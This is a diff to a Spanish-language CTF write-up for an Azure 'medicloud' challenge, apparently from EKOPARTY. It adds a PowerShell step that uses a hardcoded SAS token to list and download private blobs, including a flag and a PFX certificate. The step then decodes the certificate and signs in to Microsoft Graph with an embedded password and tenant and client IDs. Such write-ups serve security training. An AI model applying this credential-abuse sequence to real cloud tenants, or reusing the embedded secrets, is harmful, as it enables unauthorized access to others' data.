@@ -85,13 +85,49 @@ curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/certifica
 curl "https://ctf25sa[suffix].blob.core.windows.net/medicloud-research/script.ps1?${SAS_TOKEN}" > script.ps1
 ```
 
-**Paso 6: (Opcional) Usar el Certificado para Azure AD**
-```bash
-# Decodificar el certificado
-base64 -d cert.b64 > medicloud_cert.pfx
+**Paso 6: Usar PowerShell para Acceso Avanzado con Certificado**
 
-# Ejecutar el script PowerShell (si tienes PowerShell)
-pwsh script.ps1
+```powershell
+# Importar módulo de Azure Storage
+Import-Module Az.Storage
+
+# Configurar variables del storage account
+$storageAccountName = "ctf25sace22f93a"  # Reemplazar con el nombre real
+$sasToken = "sv=2018-11-09&sr=c&st=2024-01-01T00:00:00Z&se=2026-12-31T23:59:59Z&sp=rl&spr=https&sig=sa5HBK837Jxz8q%2B20G%2B%2Fl0Uvf3ExRMLlStgqA38Gj%2BM%3D"
+
+# Crear contexto de storage con SAS token
+$context = New-AzStorageContext -StorageAccountName $storageAccountName -SasToken $sasToken
+
+# Listar archivos en el container privado
+Get-AzStorageBlob -Container "medicloud-research" -Context $context
+
+# Descargar archivos específicos
+$destinationPath = "./"
+Get-AzStorageBlobContent -Blob "certificadob64delpfx.txt" -Container "medicloud-research" -Destination $destinationPath -Context $context
+Get-AzStorageBlobContent -Blob "flag.txt" -Container "medicloud-research" -Destination $destinationPath -Context $context
+Get-AzStorageBlobContent -Blob "script.ps1" -Container "medicloud-research" -Destination $destinationPath -Context $context
+
+# Decodificar el certificado PFX
+$base64FilePath = "C:\Users\Gerh\Desktop\EKOPARTY\certificadob64delpfx.txt"
+$base64Content = Get-Content -Path $base64FilePath -Raw
+$pfxBytes = [System.Convert]::FromBase64String($base64Content)
+$outputPfxPath = "C:\Users\Gerh\Desktop\EKOPARTY\certdecode.pfx"
+[System.IO.File]::WriteAllBytes($outputPfxPath, $pfxBytes)
+
+# Configurar variables para autenticación Azure AD
+$TenantId = "c390256a-8963-4732-b874-85b7b0a4d514"  # Reemplazar con Tenant ID real
+$ClientId = "639a3cfa-93f6-43bf-ab93-fc48757e5ed1"  # Reemplazar con Client ID real
+$Password = "M3d1Cl0ud25!"
+$certPath = "C:\Users\Gerh\Desktop\EKOPARTY\certdecode.pfx"
+
+# Cargar certificado con contraseña
+$clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $certPath, $Password
+
+# Conectar a Microsoft Graph usando certificado
+Connect-MgGraph -ClientId $ClientId -TenantId $TenantId -Certificate $clientCertificate
+
+# Verificar conexión exitosa
+Get-MgContext
 ```
 
 **Resultado esperado:**
